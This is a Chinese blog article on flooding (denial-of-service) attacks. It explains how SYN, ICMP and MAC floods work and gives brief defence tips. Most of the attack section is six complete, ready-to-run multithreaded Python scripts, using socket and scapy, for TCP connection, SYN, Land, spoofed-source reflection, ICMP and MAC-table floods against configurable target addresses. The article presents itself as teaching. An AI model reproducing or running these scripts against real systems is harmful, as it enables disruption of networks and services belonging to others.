{"title":"常见的泛洪攻击","uid":"f7d232a5ab9feede8dda296a58233a54","slug":"常见的泛洪攻击","date":"2022-08-25T07:51:03.000Z","updated":"2022-08-25T11:30:49.004Z","comments":true,"path":"api/articles/常见的泛洪攻击.json","keywords":null,"cover":"https://img1.baidu.com/it/u=2176445867,2405631310&fm=253&fmt=auto&app=138&f=JPEG?w=443&h=249","content":"<h2 id=\"一、-什么是泛洪\"><a href=\"#一、-什么是泛洪\" class=\"headerlink\" title=\"一、 什么是泛洪\"></a>一、 什么是泛洪</h2><p>​\t\t攻击者向某些网络资源发送大量的数据时发生的就是泛洪攻击。通过发起过量数据消耗网络设备的带宽、资源，导致网络设备无法提供正常服务。</p>\n<h2 id=\"二、-泛洪攻击常见种类\"><a href=\"#二、-泛洪攻击常见种类\" class=\"headerlink\" title=\"二、 泛洪攻击常见种类\"></a>二、 泛洪攻击常见种类</h2><h3 id=\"1-TCP-SYN-泛洪攻击\"><a href=\"#1-TCP-SYN-泛洪攻击\" class=\"headerlink\" title=\"1. TCP SYN 泛洪攻击\"></a>1. TCP SYN 泛洪攻击</h3><p>​\t\t在 TCP 的 3 次握手期间，当接收端收到来自发送端的初始 <code>SYN</code> 报文时，向发送端返回一个 <code>SYN+ACK</code> 报文。接收端在等待发送端的最终 <code>ACK</code> 报文时，该连接一直处于半连接状态。如果接收端最终没有收到 <code>ACK</code> 报文包，则重新发送一个 <code>SYN+ACK</code> 到发送端。</p>\n<p>​\t\t如果经过多次重试，发送端始终没有返回 <code>ACK</code> 报文，<code>则接收端关闭会话并从内存中刷新会话</code>，从传输第一个 SYN+ACK 到会话关闭大约需要 30 秒。</p>\n<p>​\t\t在这段时间内，攻击者可能将数十万个 SYN 报文发送到开放的端口，并且不回应接收端的 SYN+ACK 报文。接收端内存很快就会超过负荷，且无法再接受任何新的连接，并将现有的连接断开。</p>\n<h3 id=\"2-ICMP-泛洪攻击\"><a href=\"#2-ICMP-泛洪攻击\" class=\"headerlink\" title=\"2. ICMP 泛洪攻击\"></a>2. ICMP 泛洪攻击</h3><p>​\t\tPing命令基于<code>ICMP</code>协议。当主机去ping一台设备时发出ICMP请求报文。目标设备接收后响应一个ICMP应答报文。</p>\n<p>​\t\t如果发起大量的ICMP请求报文将会导致目标设备疲于处理这些请求报文，<code>无法处理其余正常报文</code>，导致设备无法正常工作。</p>\n<h3 id=\"3-MAC泛洪攻击\"><a href=\"#3-MAC泛洪攻击\" class=\"headerlink\" title=\"3. MAC泛洪攻击\"></a>3. MAC泛洪攻击</h3><p>​\t\tMAC泛洪攻击主要针对于局域网中交换机。</p>\n<p>​\t\t在交换机中存在<code>MAC地址表</code>，记录了端口与MAC地址的映射关系，当交换机接收到端口所连接的设备回复的MAC地址后，会将其记录在自身的MAC地址表中。</p>\n<p>​\t\tMAC地址表大小大约为<code>8KB</code>，攻击者短时间内伪造大量的MAC地址会将MAC地址表填满，剩余的MAC地址无法写入表中。<code>这时所有的数据帧将会被广播至所有端口</code>，攻击者便可以截获数据帧。同时也可能造成交换机崩溃，导致局域网断网。</p>\n<h2 id=\"三、-基于PYTHON实现泛洪攻击\"><a href=\"#三、-基于PYTHON实现泛洪攻击\" class=\"headerlink\" title=\"三、 基于PYTHON实现泛洪攻击\"></a>三、 基于PYTHON实现泛洪攻击</h2><h3 id=\"1-TCP全连接泛洪\"><a href=\"#1-TCP全连接泛洪\" class=\"headerlink\" title=\"1. TCP全连接泛洪\"></a>1. TCP全连接泛洪</h3><p>发送大量TCP三次握手报文，占用服务器资源。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> socket\n<span class=\"token keyword\">import</span> threading\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">tcp_flood</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">:</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">:</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"\n    @desc: 基于TCP协议全连接泛洪\n    @params:\n        ip: 目标IP地址\n        prot: 目标端口\n    \"\"\"</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        s <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        s<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        \n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    task <span class=\"token operator\">=</span> <span class=\"token number\">100</span>  <span class=\"token comment\"># 线程数</span>\n    ip <span class=\"token operator\">=</span> <span class=\"token string\">'192.168.2.10'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token number\">80</span>\n\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>tcp_flood<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 开启线程</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>​\t\t\t\t\t</p>\n<h3 id=\"2-TCP-SYN泛洪\"><a href=\"#2-TCP-SYN泛洪\" class=\"headerlink\" title=\"2. TCP SYN泛洪\"></a>2. TCP SYN泛洪</h3><p>发送大量SYN报文，使目标内存超负荷断开其余连接。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> scapy<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span> <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">tcp_syn_flood</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">:</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">:</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"\n    @desc: 基于TCP协议半连接泛洪\n    @params: \n        ip: 目标IP地址\n    \"\"\"</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        pkg <span class=\"token operator\">=</span> IP<span class=\"token punctuation\">(</span>dst<span class=\"token operator\">=</span>ip<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>TCP<span class=\"token punctuation\">(</span>dport<span class=\"token operator\">=</span>port<span class=\"token punctuation\">,</span> flags<span class=\"token operator\">=</span><span class=\"token string\">'S'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 构建数据报文</span>\n        sr1<span class=\"token punctuation\">(</span>pkg<span class=\"token punctuation\">)</span>\t<span class=\"token comment\"># 发送请求报文</span>\n        \n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    task <span class=\"token operator\">=</span> <span class=\"token number\">100</span>  <span class=\"token comment\"># 线程数</span>\n    ip <span class=\"token operator\">=</span> <span class=\"token string\">'192.168.2.10'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token number\">80</span>\n\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>tcp_syn_flood<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 开启线程</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"3-TCP-Land泛洪\"><a href=\"#3-TCP-Land泛洪\" class=\"headerlink\" title=\"3. TCP Land泛洪\"></a>3. TCP Land泛洪</h3><p>将源IP地址，目标IP地址设为同一个， 向目标发送SYN请求，目标会尝试与自身建立连接陷入死循环，降低性能。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> scapy<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span> <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">tcp_land_flood</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">:</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">:</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"\n    @desc: 基于TCP协议半连接泛洪\n    @params: \n        ip: 目标IP地址\n    @variable:\n        sport: 源端口（随机生成）\n        pkg: 数据报文\n    \"\"\"</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        sport <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">65536</span><span class=\"token punctuation\">)</span>\n        pkg <span class=\"token operator\">=</span> IP<span class=\"token punctuation\">(</span>src<span class=\"token operator\">=</span>ip<span class=\"token punctuation\">,</span> dst<span class=\"token operator\">=</span>ip<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>TCP<span class=\"token punctuation\">(</span>sport<span class=\"token operator\">=</span>sport<span class=\"token punctuation\">,</span> dport<span class=\"token operator\">=</span>port<span class=\"token punctuation\">,</span> flags<span class=\"token operator\">=</span><span class=\"token string\">'S'</span><span class=\"token punctuation\">)</span>\n        sr1<span class=\"token punctuation\">(</span>pkg<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    task <span class=\"token operator\">=</span> <span class=\"token number\">100</span>  <span class=\"token comment\"># 线程数</span>\n    ip <span class=\"token operator\">=</span> <span class=\"token string\">'192.168.2.10'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token number\">80</span>\n\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>tcp_land_flood<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 开启线程</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"4-反射泛洪\"><a href=\"#4-反射泛洪\" class=\"headerlink\" title=\"4. 反射泛洪\"></a>4. 反射泛洪</h3><p>存在主机A，B</p>\n<p>攻击者攻击目标为B，但是攻击者伪造自己的IP地址为B的地址，大量向A发送请求。A收到请求后返回应答报文给B，完成攻击。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> scapy<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span> <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">reflex_flood</span><span class=\"token punctuation\">(</span>sip<span class=\"token punctuation\">:</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> dip<span class=\"token punctuation\">:</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">:</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"\n    @desc: 反射攻击\n    @params: \n        sip: 目标IP地址\n        dip: 其余真实ip或其余目标IP地址\n    @variable:\n        sport: 源端口（随机生成）\n        pkg: 数据报文\n    \"\"\"</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        sport <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">65536</span><span class=\"token punctuation\">)</span>\n        pkg <span class=\"token operator\">=</span> IP<span class=\"token punctuation\">(</span>src<span class=\"token operator\">=</span>sip<span class=\"token punctuation\">,</span> dst<span class=\"token operator\">=</span>dip<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>TCP<span class=\"token punctuation\">(</span>sport<span class=\"token operator\">=</span>port<span class=\"token punctuation\">,</span> dport<span class=\"token operator\">=</span>sport<span class=\"token punctuation\">,</span> flags<span class=\"token operator\">=</span><span class=\"token string\">'S'</span><span class=\"token punctuation\">)</span>\n        sr1<span class=\"token punctuation\">(</span>pkg<span class=\"token punctuation\">)</span>\n        \n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    task <span class=\"token operator\">=</span> <span class=\"token number\">100</span>  <span class=\"token comment\"># 线程数</span>\n    sip <span class=\"token operator\">=</span> <span class=\"token string\">'192.168.2.8'</span>\n    dip <span class=\"token operator\">=</span> <span class=\"token string\">'192.168.2.10'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token number\">80</span>\n\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>reflex_flood<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>sip<span class=\"token punctuation\">,</span>dip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 开启线程</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"5-ICMP泛洪\"><a href=\"#5-ICMP泛洪\" class=\"headerlink\" title=\"5. ICMP泛洪\"></a>5. ICMP泛洪</h3><p>发送大量ICMP请求报文，使目标无法处理其余报文。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> scapy<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span> <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">icmp_flood</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">:</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"\n    @desc: 基于ICMP协议的泛洪\n    @params: \n        ip: 目标IP地址,ip设置为255可实现广播风暴\n    \"\"\"</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        pkg <span class=\"token operator\">=</span> IP<span class=\"token punctuation\">(</span>dst<span class=\"token operator\">=</span>ip<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>ICMP<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token string\">'hehhhhhhhhhhhh'</span>\n        sr1<span class=\"token punctuation\">(</span>pkg<span class=\"token punctuation\">)</span>\n        \n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    task <span class=\"token operator\">=</span> <span class=\"token number\">100</span>  <span class=\"token comment\"># 线程数</span>\n    ip <span class=\"token operator\">=</span> <span class=\"token string\">'192.168.2.10'</span>\n\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>icmp_flood<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 开启线程</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"6-MAC地址泛洪\"><a href=\"#6-MAC地址泛洪\" class=\"headerlink\" title=\"6. MAC地址泛洪\"></a>6. MAC地址泛洪</h3><p>发送大量伪造MAC地址信息，填满MAC地址表内存，使后续数据帧只能广播，实现攻击。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> scapy<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span> <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">mac_flood</span><span class=\"token punctuation\">(</span>network<span class=\"token punctuation\">:</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"\n    @desc mac泛洪\n    @params:\n        netword: 网卡名，指定对哪张网卡对应的交换机泛洪\n    @variable:\n        randMac: 随机生成一个mac地址\n        src: 发送方ip地址\n        dst: 目标mac地址\n        pkg: 数据报文\n    \"\"\"</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        randMac <span class=\"token operator\">=</span> RandMAC<span class=\"token punctuation\">(</span><span class=\"token string\">'*:*:*:*:*:*'</span><span class=\"token punctuation\">)</span>\n\n        src <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span>\n        dst <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span>\n\n        pkg <span class=\"token operator\">=</span> Ether<span class=\"token punctuation\">(</span>src<span class=\"token operator\">=</span>randMac<span class=\"token punctuation\">,</span> dst<span class=\"token operator\">=</span>randMac<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>IP<span class=\"token punctuation\">(</span>src<span class=\"token operator\">=</span>src<span class=\"token punctuation\">,</span> dst<span class=\"token operator\">=</span>dst<span class=\"token punctuation\">)</span>\n        sendp<span class=\"token punctuation\">(</span>pkg<span class=\"token punctuation\">,</span> iface<span class=\"token operator\">=</span>network<span class=\"token punctuation\">,</span> verbose<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    task <span class=\"token operator\">=</span> <span class=\"token number\">100</span>  <span class=\"token comment\"># 线程数</span>\n    network <span class=\"token operator\">=</span> <span class=\"token string\">'en0'</span>\n\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>mac_flood<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>network<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 开启线程</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"四、预防泛洪攻击\"><a href=\"#四、预防泛洪攻击\" class=\"headerlink\" title=\"四、预防泛洪攻击\"></a>四、预防泛洪攻击</h2><h3 id=\"1-扩大带宽\"><a href=\"#1-扩大带宽\" class=\"headerlink\" title=\"1. 扩大带宽\"></a>1. 扩大带宽</h3><p>​\t\tDDOS攻击主要原理就是占用服务器大量带宽导致无法正常提供服务，因此可以选择扩大带宽来抵御DDOS攻击，但攻击者也会随之提高攻击流量，一味的扩大带宽显然不是很适合。</p>\n<h3 id=\"2-监控异常流量\"><a href=\"#2-监控异常流量\" class=\"headerlink\" title=\"2. 监控异常流量\"></a>2. 监控异常流量</h3><p>​\t\t通过脚本或软件监测端口状态，如果发现异常流量，例如短时间内同一IP大量连接、超出常规的访问次数等，可以通过防火墙对该可疑IP进行封锁。</p>\n<h3 id=\"3-采用高防设备\"><a href=\"#3-采用高防设备\" class=\"headerlink\" title=\"3. 采用高防设备\"></a>3. 采用高防设备</h3><p>​\t\t购买高防服务器、高防IP、高防CDN、高防防火墙等一系列高防产品来抵御DDOS攻击</p>\n<h3 id=\"4-分布式集群防御\"><a href=\"#4-分布式集群防御\" class=\"headerlink\" title=\"4. 分布式集群防御\"></a>4. 分布式集群防御</h3><p>​\t\t在每个节点服务器配置多个IP地址(负载均衡)，并且每个节点能承受不低于50G的DDOS攻击，如一个节点受攻击无法提供服务，系统将会根据优先级设置自动切换另一个节点，并将攻击者的数据包全部返回发送点，使攻击源成为瘫痪状态。</p>\n<h3 id=\"5-过滤不必要的服务和端口\"><a href=\"#5-过滤不必要的服务和端口\" class=\"headerlink\" title=\"5. 过滤不必要的服务和端口\"></a>5. 过滤不必要的服务和端口</h3><p>​\t\t可以使用Inexpress、Express、Forwarding等工具来过滤不必要的服务和端口，即在路由器上过滤假IP。只开放服务端口成为目前很多服务器的流行做法，例如WWW服务器那么只开放80而将其他所有端口关闭或在<a href=\"https://www.zhihu.com/search?q=%E9%98%B2%E7%81%AB%E5%A2%99&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1250487746%7D\">防火墙</a>上做阻止策略。</p>\n","feature":true,"text":"一、 什么是泛洪​ 攻击者向某些网络资源发送大量的数据时发生的就是泛洪攻击。通过发起过量数据消耗网络设备的带宽、资源，导致网络设备无法提供正常服务。 二、 泛洪攻击常见种类1. TCP SYN 泛洪攻击​ 在 TCP 的 3 次握手期间，当接收端收到来自发送端的初始 SYN 报文...","link":"","photos":[],"count_time":{"symbolsCount":"4.9k","symbolsTime":"4 mins."},"categories":[{"name":"网络安全","slug":"网络安全","count":8,"path":"api/categories/网络安全.json"},{"name":"网络原理","slug":"网络安全/网络原理","count":2,"path":"api/categories/网络安全/网络原理.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":8,"path":"api/tags/网络安全.json"},{"name":"网络原理","slug":"网络原理","count":2,"path":"api/tags/网络原理.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81-%E4%BB%80%E4%B9%88%E6%98%AF%E6%B3%9B%E6%B4%AA\"><span class=\"toc-text\">一、 什么是泛洪</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81-%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB%E5%B8%B8%E8%A7%81%E7%A7%8D%E7%B1%BB\"><span class=\"toc-text\">二、 泛洪攻击常见种类</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-TCP-SYN-%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">1. TCP SYN 泛洪攻击</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-ICMP-%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">2. ICMP 泛洪攻击</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-MAC%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">3. MAC泛洪攻击</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" 